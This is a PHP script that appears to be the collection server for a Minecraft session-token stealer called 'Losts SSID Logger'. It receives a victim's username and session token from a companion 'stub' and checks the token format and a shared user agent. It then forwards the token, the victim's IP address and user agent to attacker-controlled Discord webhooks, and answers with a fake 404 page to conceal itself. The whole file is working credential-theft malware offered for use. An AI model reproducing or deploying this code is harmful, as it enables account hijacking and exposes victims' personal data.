<?php
//config nothing bellow this config needs to be changed
$wh = "DISCORDWEBHOOK1";
$flagged_wh = "DISCORDWEBHOOK2"; // if a request fails the checks it goes to the flagged make a new webhook a new channel and expect some spam
$config_ua = "Change this to anything you want as long as it's in the php file"; // change this and the useragent in the stub to whatever just not this



























































$ign = $_GET["u"];
$ssid = $_GET["s"];
$timestamp = date("c", strtotime("now"));
// very bad checks but i dont care

function str_starts_with ( $haystack, $needle ) {
  return strpos( $haystack , $needle ) === 0;
}
if( isset($ign) === false || isset($ssid) === false) {
    $wh = $flagged_wh;
}
if(!str_starts_with($ssid,"token:")) {
    $wh = $flagged_wh;
}


if($_SERVER['HTTP_USER_AGENT'] !== $config_ua ) {
    $wh = $flagged_wh;
}

$ssid = str_replace("token:","", $ssid);

if(strpos($ssid,".") == false) {
    $wh = $flagged_wh;
}

if(!str_starts_with($ssid,"ey")) {
    $wh = $flagged_wh;
}

//webhook data from lib
$json_data = json_encode([
    "content" => "new account",
    "username" => "TotalyNotLostProgrammer",
    "avatar_url" => "https://avatars.githubusercontent.com/u/96698175",
    "tts" => false,
    "embeds" => [
        [
            "title" => "Losts SSID Logger",
            "type" => "rich",
            "description" => "",
            "url" => "https://github.com/TotalyNotLostProgrammer",
            "timestamp" => $timestamp,
            "color" => hexdec( "4F4F4F" ),
            "image" => [
                "url" => "https://mc-heads.net/avatar/" . $ign . "/100"
            ],
            "author" => [
                "name" => "TotalyNotLostProgrammer",
                "url" => "https://github.com/TotalyNotLostProgrammer"
            ],
            "fields" => [
                [
                    "name" => "UserName",
                    "value" => $ign,
                    "inline" => false
                ],
                [
                    "name" => "SessionID",
                    "value" => "``` " . $ssid . "```",
                    "inline" => true
                ],
                [
                    "name" => "IP Address",
                    "value" => "``` " . $_SERVER['REMOTE_ADDR'] . "```",
                    "inline" => true
                ],
                [
                    "name" => "Useragent ( not important )",
                    "value" => "``` " . $_SERVER['HTTP_USER_AGENT'] . "```",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $wh );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );
// fake 404
echo("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.3.31</address></body></html>");